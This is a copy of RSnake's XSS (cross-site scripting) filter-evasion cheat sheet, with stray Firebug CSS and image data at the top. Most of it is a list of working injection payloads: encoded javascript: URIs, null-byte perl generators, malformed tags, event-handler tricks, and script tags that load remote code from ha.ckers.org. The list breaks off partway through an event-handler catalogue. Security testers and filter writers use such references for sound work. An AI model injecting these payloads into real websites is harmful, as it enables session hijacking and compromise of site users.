@@ -1,0 +1,427 @@
+XSS (Cross Site Scripting) Cheat Sheet
+/* See license.txt for terms of usage */ /** reset styling **/ .firebugResetStyles { z-index: 2147483646 !important; top: 0 !important; left: 0 !important; display: block !important; border: 0 none !important; margin: 0 !important; padding: 0 !important; outline: 0 !important; min-width: 0 !important; max-width: none !important; min-height: 0 !important; max-height: none !important; position: fixed !important; -moz-transform: rotate(0deg) !important; -moz-transform-origin: 50% 50% !important; -moz-border-radius: 0 !important; -moz-box-shadow: none !important; background: transparent none !important; pointer-events: none !important; } .firebugBlockBackgroundColor { background-color: transparent !important; } .firebugResetStyles:before, .firebugResetStyles:after { content: "" !important; } /**actual styling to be modified by firebug theme**/ .firebugCanvas { display: none !important; } /* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */ .firebugLayoutBox { width: auto !important; position: static !important; } .firebugLayoutBoxOffset { opacity: 0.8 !important; position: fixed !important; } .firebugLayoutLine { opacity: 0.4 !important; background-color: #000000 !important; } .firebugLayoutLineLeft, .firebugLayoutLineRight { width: 1px !important; height: 100% !important; } .firebugLayoutLineTop, .firebugLayoutLineBottom { width: 100% !important; height: 1px !important; } .firebugLayoutLineTop { margin-top: -1px !important; border-top: 1px solid #999999 !important; } .firebugLayoutLineRight { border-right: 1px solid #999999 !important; } .firebugLayoutLineBottom { border-bottom: 1px solid #999999 !important; } .firebugLayoutLineLeft { margin-left: -1px !important; border-left: 1px solid #999999 !important; } /* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */ .firebugLayoutBoxParent { border-top: 0 none !important; border-right: 1px dashed #E00 !important; border-bottom: 1px dashed #E00 !important; border-left: 0 none !important; position: fixed !important; width: auto !important; } .firebugRuler{ position: absolute !important; } .firebugRulerH { top: -15px !important; left: 0 !important; width: 100% !important; height: 14px !important; background: url("data:image/png,%89PNG%0D%0A%1A%0A%00%00%00%0DIHDR%00%00%13%88%00%00%00%0E%08%02%00%00%00L%25a%0A%00%00%00%04gAMA%00%00%D6%D8%D4OX2%00%00%00%19tEXtSoftware%00Adobe%20ImageReadyq%C9e%3C%00%00%04%F8IDATx%DA%EC%DD%D1n%E2%3A%00E%D1%80%F8%FF%EF%E2%AF2%95%D0D4%0E%C1%14%B0%8Fa-%E9%3E%CC%9C%87n%B9%81%A6W0%1C%A6i%9A%E7y%0As8%1CT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AATE9%FE%FCw%3E%9F%AF%2B%2F%BA%97%FDT%1D~K(%5C%9D%D5%EA%1B%5C%86%B5%A9%BDU%B5y%80%ED%AB*%03%FAV9%AB%E1%CEj%E7%82%EF%FB%18%BC%AEJ8%AB%FA'%D2%BEU9%D7U%ECc0%E1%A2r%5DynwVi%CFW%7F%BB%17%7Dy%EACU%CD%0E%F0%FA%3BX%FEbV%FEM%9B%2B%AD%BE%AA%E5%95v%AB%AA%E3E5%DCu%15rV9%07%B5%7F%B5w%FCm%BA%BE%AA%FBY%3D%14%F0%EE%C7%60%0EU%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5JU%88%D3%F5%1F%AE%DF%3B%1B%F2%3E%DAUCNa%F92%D02%AC%7Dm%F9%3A%D4%F2%8B6%AE*%BF%5C%C2Ym~9g5%D0Y%95%17%7C%C8c%B0%7C%18%26%9CU%CD%13i%F7%AA%90%B3Z%7D%95%B4%C7%60%E6E%B5%BC%05%B4%FBY%95U%9E%DB%FD%1C%FC%E0%9F%83%7F%BE%17%7DkjMU%E3%03%AC%7CWj%DF%83%9An%BCG%AE%F1%95%96yQ%0Dq%5Dy%00%3Et%B5'%FC6%5DS%95pV%95%01%81%FF'%07%00%00%00%00%00%00%00%00%00%F8x%C7%F0%BE%9COp%5D%C9%7C%AD%E7%E6%EBV%FB%1E%E0(%07%E5%AC%C6%3A%ABi%9C%8F%C6%0E9%AB%C0'%D2%8E%9F%F99%D0E%B5%99%14%F5%0D%CD%7F%24%C6%DEH%B8%E9rV%DFs%DB%D0%F7%00k%FE%1D%84%84%83J%B8%E3%BA%FB%EF%20%84%1C%D7%AD%B0%8E%D7U%C8Y%05%1E%D4t%EF%AD%95Q%BF8w%BF%E9%0A%BF%EB%03%00%00%00%00%00%00%00%00%00%B8vJ%8E%BB%F5%B1u%8Cx%80%E1o%5E%CA9%AB%CB%CB%8E%03%DF%1D%B7T%25%9C%D5(%EFJM8%AB%CC'%D2%B2*%A4s%E7c6%FB%3E%FA%A2%1E%80~%0E%3E%DA%10x%5D%95Uig%15u%15%ED%7C%14%B6%87%A1%3B%FCo8%A8%D8o%D3%ADO%01%EDx%83%1A~%1B%9FpP%A3%DC%C6'%9C%95gK%00%00%00%00%00%00%00%00%00%20%D9%C9%11%D0%C0%40%AF%3F%EE%EE%92%94%D6%16X%B5%BCMH%15%2F%BF%D4%A7%C87%F1%8E%F2%81%AE%AAvzr%DA2%ABV%17%7C%E63%83%E7I%DC%C6%0Bs%1B%EF6%1E%00%00%00%00%00%00%00%00%00%80cr%9CW%FF%7F%C6%01%0E%F1%CE%A5%84%B3%CA%BC%E0%CB%AA%84%CE%F9%BF)%EC%13%08WU%AE%AB%B1%AE%2BO%EC%8E%CBYe%FE%8CN%ABr%5Dy%60~%CFA%0D%F4%AE%D4%BE%C75%CA%EDVB%EA(%B7%F1%09g%E5%D9%12%00%00%00%00%00%00%00%00%00H%F6%EB%13S%E7y%5E%5E%FB%98%F0%22%D1%B2'%A7%F0%92%B1%BC%24z3%AC%7Dm%60%D5%92%B4%7CEUO%5E%F0%AA*%3BU%B9%AE%3E%A0j%94%07%A0%C7%A0%AB%FD%B5%3F%A0%F7%03T%3Dy%D7%F7%D6%D4%C0%AAU%D2%E6%DFt%3F%A8%CC%AA%F2%86%B9%D7%F5%1F%18%E6%01%F8%CC%D5%9E%F0%F3z%88%AA%90%EF%20%00%00%00%00%00%00%00%00%00%C0%A6%D3%EA%CFi%AFb%2C%7BB%0A%2B%C3%1A%D7%06V%D5%07%A8r%5D%3D%D9%A6%CAu%F5%25%CF%A2%99%97zNX%60%95%AB%5DUZ%D5%FBR%03%AB%1C%D4k%9F%3F%BB%5C%FF%81a%AE%AB'%7F%F3%EA%FE%F3z%94%AA%D8%DF%5B%01%00%00%00%00%00%00%00%00%00%8E%FB%F3%F2%B1%1B%8DWU%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*UiU%C7%BBe%E7%F3%B9%CB%AAJ%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5*%AAj%FD%C6%D4%5Eo%90%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5%86%AF%1B%9F%98%DA%EBm%BBV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%AD%D6%E4%F58%01%00%00%00%00%00%00%00%00%00%00%00%00%00%40%85%7F%02%0C%008%C2%D0H%16j%8FX%00%00%00%00IEND%AEB%60%82") repeat-x !important; border-top: 1px solid #BBBBBB !important; border-right: 1px dashed #BBBBBB !important; border-bottom: 1px solid #000000 !important; } .firebugRulerV { top: 0 !important; left: -15px !important; width: 14px !important; height: 100% !important; background: url("data:image/png,%89PNG%0D%0A%1A%0A%00%00%00%0DIHDR%00%00%00%0E%00%00%13%88%08%02%00%00%00%0E%F5%CB%10%00%00%00%04gAMA%00%00%D6%D8%D4OX2%00%00%00%19tEXtSoftware%00Adobe%20ImageReadyq%C9e%3C%00%00%06~IDATx%DA%EC%DD%D1v%A20%14%40Qt%F1%FF%FF%E4%97%D9%07%3BT%19%92%DC%40(%90%EEy%9A5%CB%B6%E8%F6%9Ac%A4%CC0%84%FF%DC%9E%CF%E7%E3%F1%88%DE4%F8%5D%C7%9F%2F%BA%DD%5E%7FI%7D%F18%DDn%BA%C5%FB%DF%97%BFk%F2%10%FF%FD%B4%F2M%A7%FB%FD%FD%B3%22%07p%8F%3F%AE%E3%F4S%8A%8F%40%EEq%9D%BE8D%F0%0EY%A1Uq%B7%EA%1F%81%88V%E8X%3F%B4%CEy%B7h%D1%A2E%EBohU%FC%D9%AF2fO%8BBeD%BE%F7X%0C%97%A4%D6b7%2Ck%A5%12%E3%9B%60v%B7r%C7%1AI%8C%BD%2B%23r%00c0%B2v%9B%AD%CA%26%0C%1Ek%05A%FD%93%D0%2B%A1u%8B%16-%95q%5Ce%DCSO%8E%E4M%23%8B%F7%C2%FE%40%BB%BD%8C%FC%8A%B5V%EBu%40%F9%3B%A72%FA%AE%8C%D4%01%CC%B5%DA%13%9CB%AB%E2I%18%24%B0n%A9%0CZ*Ce%9C%A22%8E%D8NJ%1E%EB%FF%8F%AE%CAP%19*%C3%BAEKe%AC%D1%AAX%8C*%DEH%8F%C5W%A1e%AD%D4%B7%5C%5B%19%C5%DB%0D%EF%9F%19%1D%7B%5E%86%BD%0C%95%A12%AC%5B*%83%96%CAP%19%F62T%86%CAP%19*%83%96%CA%B8Xe%BC%FE)T%19%A1%17xg%7F%DA%CBP%19*%C3%BA%A52T%86%CAP%19%F62T%86%CA%B0n%A9%0CZ%1DV%C6%3D%F3%FCH%DE%B4%B8~%7F%5CZc%F1%D6%1F%AF%84%F9%0F6%E6%EBVt9%0E~%BEr%AF%23%B0%97%A12T%86%CAP%19%B4T%86%CA%B8Re%D8%CBP%19*%C3%BA%A52huX%19%AE%CA%E5%BC%0C%7B%19*CeX%B7h%A9%0C%95%E1%BC%0C%7B%19*CeX%B7T%06%AD%CB%5E%95%2B%BF.%8F%C5%97%D5%E4%7B%EE%82%D6%FB%CF-%9C%FD%B9%CF%3By%7B%19%F62T%86%CA%B0n%D1R%19*%A3%D3%CA%B0%97%A12T%86uKe%D0%EA%B02*%3F1%99%5DB%2B%A4%B5%F8%3A%7C%BA%2B%8Co%7D%5C%EDe%A8%0C%95a%DDR%19%B4T%C66%82fA%B2%ED%DA%9FC%FC%17GZ%06%C9%E1%B3%E5%2C%1A%9FoiB%EB%96%CA%A0%D5qe4%7B%7D%FD%85%F7%5B%ED_%E0s%07%F0k%951%ECr%0D%B5C%D7-g%D1%A8%0C%EB%96%CA%A0%A52T%C6)*%C3%5E%86%CAP%19%D6-%95A%EB*%95q%F8%BB%E3%F9%AB%F6%E21%ACZ%B7%22%B7%9B%3F%02%85%CB%A2%5B%B7%BA%5E%B7%9C%97%E1%BC%0C%EB%16-%95%A12z%AC%0C%BFc%A22T%86uKe%D0%EA%B02V%DD%AD%8A%2B%8CWhe%5E%AF%CF%F5%3B%26%CE%CBh%5C%19%CE%CB%B0%F3%A4%095%A1%CAP%19*Ce%A8%0C%3BO*Ce%A8%0C%95%A12%3A%AD%8C%0A%82%7B%F0v%1F%2FD%A9%5B%9F%EE%EA%26%AF%03%CA%DF9%7B%19*Ce%A8%0C%95%A12T%86%CA%B8Ze%D8%CBP%19*Ce%A8%0C%95%D1ae%EC%F7%89I%E1%B4%D7M%D7P%8BjU%5C%BB%3E%F2%20%D8%CBP%19*Ce%A8%0C%95%A12T%C6%D5*%C3%5E%86%CAP%19*Ce%B4O%07%7B%F0W%7Bw%1C%7C%1A%8C%B3%3B%D1%EE%AA%5C%D6-%EBV%83%80%5E%D0%CA%10%5CU%2BD%E07YU%86%CAP%19*%E3%9A%95%91%D9%A0%C8%AD%5B%EDv%9E%82%FFKOee%E4%8FUe%A8%0C%95%A12T%C6%1F%A9%8C%C8%3D%5B%A5%15%FD%14%22r%E7B%9F%17l%F8%BF%ED%EAf%2B%7F%CF%ECe%D8%CBP%19*Ce%A8%0C%95%E1%93~%7B%19%F62T%86%CAP%19*Ce%A8%0C%E7%13%DA%CBP%19*Ce%A8%0CZf%8B%16-Z%B4h%D1R%19f%8B%16-Z%B4h%D1R%19%B4%CC%16-Z%B4h%D1R%19%B4%CC%16-Z%B4h%D1%A2%A52%CC%16-Z%B4h%D1%A2%A52h%99-Z%B4h%D1%A2%A52h%99-Z%B4h%D1%A2EKe%98-Z%B4h%D1%A2EKe%D02%5B%B4h%D1%A2EKe%D02%5B%B4h%D1%A2E%8B%96%CA0%5B%B4h%D1%A2E%8B%96%CA%A0e%B6h%D1%A2E%8B%96%CA%A0e%B6h%D1%A2E%8B%16-%95a%B6h%D1%A2E%8B%16-%95A%CBl%D1%A2E%8B%16-%95A%CBl%D1%A2E%8B%16-Z*%C3l%D1%A2E%8B%16-Z*%83%96%D9%A2E%8B%16-Z*%83%96%D9%A2E%8B%16-Z%B4T%86%D9%A2E%8B%16-Z%B4T%06-%B3E%8B%16-Z%B4T%06-%B3E%8B%16-Z%B4h%A9%0C%B3E%8B%16-Z%B4h%A9%0CZf%8B%16-Z%B4h%A9%0CZf%8B%16-Z%B4h%D1R%19f%8B%16-Z%B4h%D1R%19%B4%CC%16-Z%B4h%D1R%19%B4%CC%16-Z%B4h%D1%A2%A52%CC%16-Z%B4h%D1%A2%A52h%99-Z%B4h%D1%A2%A52h%99-Z%B4h%D1%A2EKe%98-Z%B4h%D1%A2EKe%D02%5B%B4h%D1%A2EKe%D02%5B%B4h%D1%A2E%8B%96%CA0%5B%B4h%D1%A2E%8B%96%CA%A0e%B6h%D1%A2E%8B%96%CA%A0e%B6h%D1%A2E%8B%16-%95a%B6h%D1%A2E%8B%16-%95A%CBl%D1%A2E%8B%16-%95A%CBl%D1%A2E%8B%16-Z*%C3l%D1%A2E%8B%16-Z*%83%96%D9%A2E%8B%16-Z*%83%96%D9%A2E%8B%16-Z%B4T%86%D9%A2E%8B%16-Z%B4T%06-%B3E%8B%16-Z%B4T%06-%B3E%8B%16-Z%B4h%A9%0C%B3E%8B%16-Z%B4h%A9%0CZf%8B%16-Z%B4h%A9%0CZf%8B%16-Z%B4h%D1R%19f%8B%16-Z%B4h%D1R%19%B4%CC%16-Z%B4h%D1R%19%B4%CC%16-Z%B4h%D1%A2%A52%CC%16-Z%B4h%D1%A2%A52h%99-Z%B4h%D1%A2%A52h%99-Z%B4h%D1%A2EKe%98-Z%B4h%D1%A2EKe%D02%5B%B4h%D1%A2EKe%D02%5B%B4h%D1%A2E%8B%96%CA0%5B%B4h%D1%A2E%8B%96%CA%A0e%B6h%D1%A2E%8B%96%CA%A0e%B6h%D1%A2E%8B%16-%95a%B6h%D1%A2E%8B%16-%95A%CBl%D1%A2E%8B%16-%95A%CBl%D1%A2E%8B%16-Z*%C3l%D1%A2E%8B%16-Z*%83%96%D9%A2E%8B%16-Z*%83%96%D9%A2E%8B%16-Z%B4T%86%D9%A2E%8B%16-Z%B4T%06-%B3E%8B%16-Z%B4%AE%A4%F5%25%C0%00%DE%BF%5C'%0F%DA%B8q%00%00%00%00IEND%AEB%60%82") repeat-y !important; border-left: 1px solid #BBBBBB !important; border-right: 1px solid #000000 !important; border-bottom: 1px dashed #BBBBBB !important; } .overflowRulerX > .firebugRulerV { left: 0 !important; } .overflowRulerY > .firebugRulerH { top: 0 !important; } /* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */ .fbProxyElement { position: fixed !important; pointer-events: auto !important; }
+Esp: for filter evasion
+By
+RSnake
+Note from the author: XSS is Cross Site Scripting. If you don't know how XSS (Cross Site Scripting) works, this page probably won't help you. This page is for people who already understand the basics of XSS attacks but want a deep understanding of the nuances regarding filter evasion. This page will also not show you how to mitigate XSS vectors or how to write the actual cookie/credential stealing/replay/session riding portion of the attack. It will simply show the underlying methodology and you can infer the rest. Also, please note my XSS page has been replicated by the
+OWASP 2.0 Guide
+in the Appendix section with my permission. However, because this is a living document I suggest you continue to use this site to stay up to date.
+Also, please note that most of these cross site scripting vectors have been tested in the browsers listed at the bottom of the page, however, if you have specific concerns about outdated or obscure versions please download them from
+Evolt
+. Please see the
+XML format of the XSS Cheat Sheet
+if you intend to use
+CAL9000
+or other automated tools. If you have an RSS reader feel free to subscribe to the Web Application Security RSS feed below, or join the
+forum
+:
+XSS (Cross Site Scripting):
+XSS locator
+. Inject this string, and in most cases where a script is vulnerable with no special XSS vector requirements the word "XSS" will pop up. Use the
+URL encoding calculator
+below to encode the entire string. Tip: if you're in a rush and need to quickly check a page, often times injecting the depreciated "<PLAINTEXT>" tag will be enough to check to see if something is vulnerable to XSS by messing up the output appreciably:
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+Browser support: [
+IE7.0
+|
+IE6.0
+NS8.1-IE
+] [
+NS8.1-G
+FF2.0
+O9.02
+]
+XSS locator 2
+. If you don't have much space and know there is no vulnerable JavaScript on the page, this string is a nice compact XSS injection check. View source after injecting it and look for <XSS verses &lt;XSS to see if it is vulnerable:
+'';!--"<XSS>=&{()}
+No filter evasion
+. This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here):
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+Image XSS
+using the JavaScript directive (IE7.0 doesn't support the JavaScript directive in context of an image, but it does in other contexts, but the following show the principles that would work in other tags as well - I'll probably revise this at a later date):
+<IMG SRC="javascript:alert('XSS');">
+No quotes and no semicolon
+<IMG SRC=javascript:alert('XSS')>
+Case insensitive
+XSS attack vector:
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+HTML entities
+(the semicolons are required for this to work):
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+Grave accent
+obfuscation (If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don't know about grave accents):
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+Malformed IMG tags
+. Originally found by
+Begeek
+(but cleaned up and shortened to work in all browsers), this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes. I assume this was originally meant to correct sloppy coding. This would make it significantly more difficult to correctly parse apart an HTML tag:
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+fromCharCode
+(if no quotes of any kind are allowed you can eval() a fromCharCode in JavaScript to create any XSS vector you need). Click
+here
+to build your own (thanks to Hannes Leopold):
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+UTF-8 Unicode
+encoding (all of the XSS examples that use a javascript: directive inside of an <IMG tag will not work in Firefox or Netscape 8.1+ in the Gecko rendering engine mode). Use the
+XSS calculator
+for more information:
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+Long UTF-8 Unicode
+encoding without semicolons (this is often effective in XSS that attempts to look for "&#XX;", since most people don't know about padding - up to 7 numeric characters total). This is also useful against people who decode against strings like $tmp_string =~ s/.*\&#(\d+);.*/$1/; which incorrectly assumes a semicolon is required to terminate a html encoded string (I've seen this in the wild):
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+Hex encoding
+without semicolons (this is also a viable XSS attack against the above string $tmp_string =~ s/.*\&#(\d+);.*/$1/; which assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters). Use the
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+Embedded tab
+to break up the cross site scripting attack:
+<IMG SRC="jav ascript:alert('XSS');">
+Embedded encoded tab
+to break up XSS:
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+Embeded newline
+to break up XSS. Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. See the
+ascii chart
+for more details. The following four XSS examples illustrate this vector:
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+Embedded carriage return
+to break up XSS (Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.):
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+Multiline
+Injected JavaScript using ASCII carriage returns (same as above only a more extreme example of this XSS vector) these are not spaces just one of the three characters as described above:
+<IMG SRC = " j a v a s c r i p t : a l e r t ( ' X S S ' ) " >
+Null
+breaks up JavaScript directive. Okay, I lied, null chars also work as XSS vectors but not like above, you need to inject them directly using something like
+Burp Proxy
+or use %00 in the URL string or if you want to write your own injection tool you can either use
+vim
+(^V^@ will produce a null) or the following program to generate it into a text file. Okay, I lied again, older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hypen control char). But the null char %00 is much more useful and helped me bypass certain real world filters with a variation on this example:
+perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
+breaks up cross site scripting vector. Here is a little known XSS attack vector using null characters. You can actually break up the HTML itself using the same nulls as shown above. I've seen this vector bypass some of the most restrictive XSS filters to date:
+perl -e 'print "<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>";' > out
+Spaces and meta chars
+before the JavaScript in images for XSS (this is useful if the pattern match doesn't take into account spaces in the word "javascript:" -which is correct since that won't render- and makes the false assumption that you can't have a space between the quote and the "javascript:" keyword. The actual reality is you can have any char from 1-32 in decimal):
+<IMG SRC=" &#14; javascript:alert('XSS');">
+Non-alpha-non-digit
+XSS. While I was reading the Firefox HTML parser I found that it assumes a non-alpha-non-digit is not valid after an HTML keyword and therefor considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example "<SCRIPT\s" != "<SCRIPT/XSS\s":
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+Non-alpha-non-digit part 2
+XSS. yawnmoth brought my attention to this vector, based on the same idea as above, however, I expanded on it, using my fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc...) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this also applies to the grave accent char as seen here:
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+Non-alpha-non-digit part 3
+XSS.
+Yair Amit
+brought this to my attention that there is slightly different behavior between the IE and Gecko rendering engines that allows just a slash between the tag and the parameter with no spaces. This could be useful if the system does not allow spaces.
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+Extraneous open brackets
+. Submitted by Franz Sedlmaier, this XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like
+Boyer-Moore
+that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course). The double slash comments out the ending extraneous bracket to supress a JavaScript error:
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+No closing script tags
+. In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don't actually need the "></SCRIPT>" portion of this Cross Site Scripting vector. Firefox assumes it's safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn't effect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they're not needed generally, although beware, I have no idea what the HTML will end up looking like once this is injected:
+<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
+Protocol resolution in script tags
+. This particular variant was submitted by
+Łukasz Pilorz
+and was based partially off of Ozh's protocol resolution bypass below. This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a </SCRIPT> tag at the end. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The ".j" is valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag.
+<SCRIPT SRC=//ha.ckers.org/.j>
+Half open
+HTML/JavaScript XSS vector. Unlike Firefox the IE rendering engine doesn't add extra data to your page, but it does allow the javascript: directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes there is any HTML tag below where you are injecting this cross site scripting vector. Even though there is no close ">" tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around
+the following NIDS regex
+: /((\%3D)|(=))[^\n]*((\%3C)|<)[^\n]+((\%3E)|>)/ because it doesn't require the end ">". As a side note, this was also affective against a real world XSS filter I came across using an open ended <IFRAME tag instead of an <IMG tag:
+<IMG SRC="javascript:alert('XSS')"
+Double open
+angle brackets. This is an odd one that
+Steven Christey
+brought to my attention. At first I misclassified this as the same XSS vector as above but it's surprisingly different. Using an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering. Without it, Firefox will work but Netscape won't:
+<iframe src=http://ha.ckers.org/scriptlet.html <
+XSS with no single quotes or double quotes or semicolons
+<SCRIPT>a=/XSS/ alert(a.source)</SCRIPT>
+Escaping JavaScript escapes
+. When the application is written to output some user information inside of a JavaScript like the following: <SCRIPT>var a="$ENV{QUERY_STRING}";</SCRIPT> and you want to inject your own JavaScript into it but the server side application escapes certain quotes you can circumvent that by escaping their escape character. When this is gets injected it will read <SCRIPT>var a="\\";alert('XSS');//";</SCRIPT> which ends up un-escaping the double quote and causing the Cross Site Scripting vector to fire. The
+uses this method.:
+\";alert('XSS');//
+End title tag
+. This is a simple XSS vector that closes <TITLE> tags, which can encapsulate the malicious cross site scripting attack:
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+INPUT image
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+BODY image
+<BODY BACKGROUND="javascript:alert('XSS')">
+BODY tag
+(I like this method because it doesn't require using any variants of "javascript:" or "<SCRIPT..." to accomplish the XSS attack).
+Dan Crowley
+additionally noted that you can put a space before the equals sign ("onload=" != "onload ="):
+<BODY ONLOAD=alert('XSS')>
+Event Handlers
+that can be used in similar XSS attacks to the one above (this is the most comprehensive list on the net, at the time of this writing). Please note I have excluded browser support from this section because each one may have different results in different browsers. Thanks to
+Rene Ledosquet
+for the HTML+TIME updates:
+1. FSCommand() (attacker can use this when executed from within an embedded Flash object) 2. onAbort() (when user aborts the loading of an image) 3. onActivate() (when object is set as the active element) 4. onAfterPrint() (activates after user prints or previews print job) 5. onAfterUpdate() (activates on data object after updating data in the source object) 6. onBeforeActivate() (fires before the object is set as the active element) 7. onBeforeCopy() (attacker executes the attack string right before a selection is copied to the clipboard - attackers can do this with the execCommand("Copy") function) 8. onBeforeCut() (attacker executes the attack string right before a selection is cut) 9. onBeforeDeactivate() (fires right after the activeElement is changed from the current object) 10. onBeforeEditFocus() (Fires before an object contained in an editable element enters a UI-activated state or when an editable container object is control selected) 11. onBeforePaste() (user needs to be tricked into pasting or be forced into it using the execCommand("Paste") function) 12. onBeforePrint() (user would need to be tricked into printing or attacker could use the print() or execCommand("Print") function). 13. onBeforeUnload() (user would need to be tricked into closing the browser - attacker cannot unload windows unless it was spawned from the parent) 14. onBegin() (the onbegin event fires immediately when the element's timeline begins) 15. onBlur() (in the case where another popup is loaded and window looses focus) 16. onBounce() (fires when the behavior property of the marquee object is set to "alternate" and the contents of the marquee reach one side of the window) 17. onCellChange() (fires when data changes in the data provider) 18. onChange() (select, text, or TEXTAREA field loses focus and its value has been modified) 19. onClick() (someone clicks on a form) 20. onContextMenu() (user would need to right click on attack area) 21. onControlSelect() (fires when the user is about to make a control selection of the object) 22. onCopy() (user needs to copy something or it can be exploited using the execCommand("Copy") command) 23. onCut() (user needs to copy something or it can be exploited using the execCommand("Cut") command) 24. onDataAvailable() (user would need to change data in an element, or attacker could perform the same function) 25. onDataSetChanged() (fires when the data set exposed by a data source object changes) 26. onDataSetComplete() (fires to indicate that all data is available from the data source object) 27. onDblClick() (user double-clicks a form element or a link) 28. onDeactivate() (fires when the activeElement is changed from the current object to another object in the parent document) 29. onDrag() (requires that the user drags an object) 30. onDragEnd() (requires that the user drags an object) 31. onDragLeave() (requires that the user drags an object off a valid location) 32. onDragEnter() (requires that the user drags an object into a valid location) 33. onDragOver() (requires that the user drags an object into a valid location) 34. onDragDrop() (user drops an object (e.g. file) onto the browser window) 35. onDrop() (user drops an object (e.g. file) onto the browser window) 36. onEnd() (the onEnd event fires when the timeline ends. This can be exploited, like most of the HTML+TIME event handlers by doing something like <P STYLE="behavior:url('#default#time2')" onEnd="alert('XSS')">) 37. onError() (loading of a document or image causes an error) 38. onErrorUpdate() (fires on a databound object when an error occurs while updating the associated data in the data source object) 39. onFilterChange() (fires when a visual filter completes state change) 40. onFinish() (attacker can create the exploit when marquee is finished looping) 41. onFocus() (attacker executes the attack string when the window gets focus) 42. onFocusIn() (attacker executes the attack string when window gets focus) 43. onFocusOut() (attacker executes the attack string when window looses focus) 44. onHelp() (attacker executes the attack string when users hits F1 while the window is in focus) 45. onKeyDown() (user depresses a key) 46. onKeyPress() (user presses or holds down a key) 47. onKeyUp() (user releases a key) 48. onLayoutComplete() (user would have to print or print preview) 49. onLoad() (attacker executes the attack string after the window loads) 50. 